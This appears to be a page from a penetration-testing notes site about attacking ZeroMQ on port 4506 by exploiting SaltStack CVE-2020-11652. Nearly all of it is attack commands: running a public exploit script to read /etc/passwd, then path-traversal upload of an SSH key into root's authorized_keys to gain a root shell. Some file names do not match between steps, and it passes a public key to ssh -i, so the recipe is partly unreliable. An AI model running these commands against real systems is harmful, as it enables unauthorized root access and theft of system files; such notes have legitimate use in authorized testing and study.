---
title: ZeroMQ - 4506
layout: default
nav_order: 11
parent: Active Recon

---

# ZeroMQ Enumeration
{: .no_toc }

## Table of Contents
{: .no_toc .text-delta }
1. TOC
{:toc}

## CVE-2020-11652
SaltStack Exploit (Remote Code Execution) 

* https://github.com/Al1ex/CVE-2020-11652
* https://thehackernews.com/2020/05/saltstack-rce-vulnerability.html

#### Reading /etc/passwd file
```bash
python3 CVE-2020-11652.py -m $IP -p 4506 -lh 4444 --read /etc/passwd
```
#### SSH key / authorized_keys transfer
1. Create SSH public key: 
```bash
ssh-keygen
```

2. Take SSH public key and transfer to a file called `authorized_keys` 
```bash
echo example.pub > authorized_keys
```

3. Transfer `authorized_keys` to the target
```bash
python3 exploit.py -m $IP -p 4506 --upload-src ~/.ssh/redis.pub --upload-dest ../../../../../../root/.ssh/authorized_keys
```

4. SSH into the target with the created public SSH key
```bash
ssh -i ~/.ssh/example.pub root@$IP
```

5. Should be able to obtain root shell